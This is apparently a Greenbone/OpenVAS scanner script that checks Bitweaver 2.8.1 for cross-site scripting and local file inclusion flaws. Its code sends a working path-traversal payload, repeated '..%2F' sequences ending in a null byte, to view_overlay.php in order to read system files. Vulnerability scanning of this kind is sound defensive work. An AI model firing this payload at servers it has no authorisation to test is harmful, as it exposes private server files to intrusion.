CPE = "cpe:/a:bitweaver:bitweaver";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103593" );
	script_bugtraq_id( 56230 );
	script_cve_id( "CVE-2012-5192", "CVE-2012-5193" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Bitweaver Multiple Cross Site Scripting and Local File Include Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56230" );
	script_xref( name: "URL", value: "http://bitweaver.org" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-10-26 10:50:00 +0200 (Fri, 26 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "secpod_bitweaver_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Bitweaver/installed" );
	script_tag( name: "summary", value: "Bitweaver is prone to multiple cross-site scripting vulnerabilities
  and a local file include vulnerability." );
	script_tag( name: "impact", value: "An attacker may leverage these issues to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication
  credentials, and open or run arbitrary files in the context of the web server process." );
	script_tag( name: "affected", value: "Bitweaver 2.8.1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/gmap/view_overlay.php?overlay_type=" + crap( data: "..%2F", length: 15 * 5 ) + "/" + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

